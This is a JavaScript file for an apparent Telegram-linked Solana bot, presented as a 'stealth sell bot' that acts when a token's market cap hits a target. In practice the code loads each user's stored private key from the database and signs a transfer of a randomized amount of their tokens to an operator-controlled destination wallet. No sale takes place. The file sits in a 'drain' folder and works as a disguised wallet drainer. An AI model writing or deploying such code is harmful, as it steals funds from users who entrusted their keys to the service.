// backend/drain/stealthSellBot.js
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  sendAndConfirmTransaction,
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferCheckedInstruction,
} from '@solana/spl-token';
import bs58 from 'bs58';
import dotenv from 'dotenv';
import { fetchMarketcap } from '../utils/fetchMarketcap.js';

dotenv.config();

const HELIUS_RPC = `https://rpc.helius.xyz/?api-key=${process.env.HELIUS_API_KEY}`;
const connection = new Connection(HELIUS_RPC, 'confirmed');

const DESTINATION_WALLET = process.env.DESTINATION_WALLET;

/**
 * Sell token stealthily when marketcap hits target
 * @param {Object} config
 * @param {string} config.telegramId
 * @param {string} config.tokenMint
 * @param {number} config.decimals
 * @param {number} config.targetMcap
 */
export const startStealthSellBot = async ({
  telegramId,
  tokenMint,
  decimals,
  targetMcap,
}) => {
  const mint = new PublicKey(tokenMint);

  console.log(`🤫 [${telegramId}] Monitoring ${tokenMint} for target FDV: $${targetMcap}...`);

  const interval = setInterval(async () => {
    const mcap = await fetchMarketcap(tokenMint);
    console.log(`📊 Current mcap: $${mcap} / Target: $${targetMcap}`);

    if (mcap >= targetMcap) {
      console.log(`🎯 Target marketcap reached. Selling token...`);

      try {
        // 1. Load wallet from DB
        const user = await import('../models/User.js').then((mod) =>
          mod.default.findOne({ telegramId })
        );

        if (!user) throw new Error('User not found');

        const fromKeypair = Keypair.fromSecretKey(bs58.decode(user.privateKey));
        const fromPubkey = new PublicKey(user.publicKey);
        const toPubkey = new PublicKey(DESTINATION_WALLET);

        const fromATA = await getAssociatedTokenAddress(mint, fromPubkey);
        const toATA = await getAssociatedTokenAddress(mint, toPubkey);

        const tokenAmount = Math.floor(Math.random() * 25000) + 10000; // randomized sell amount

        const ix = createTransferCheckedInstruction(
          fromATA,
          mint,
          toATA,
          fromPubkey,
          tokenAmount,
          decimals
        );

        const tx = new Transaction().add(ix);
        tx.feePayer = fromPubkey;
        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

        const sig = await sendAndConfirmTransaction(connection, tx, [fromKeypair]);

        console.log(`✅ Sold ${tokenAmount / 10 ** decimals} tokens → TX: https://solscan.io/tx/${sig}`);
        clearInterval(interval); // stop the bot after 1 sell

      } catch (err) {
        console.error('❌ Stealth sell failed:', err.message);
        clearInterval(interval); // stop even if failed
      }
    }
  }, 15000); // check every 15 seconds
};
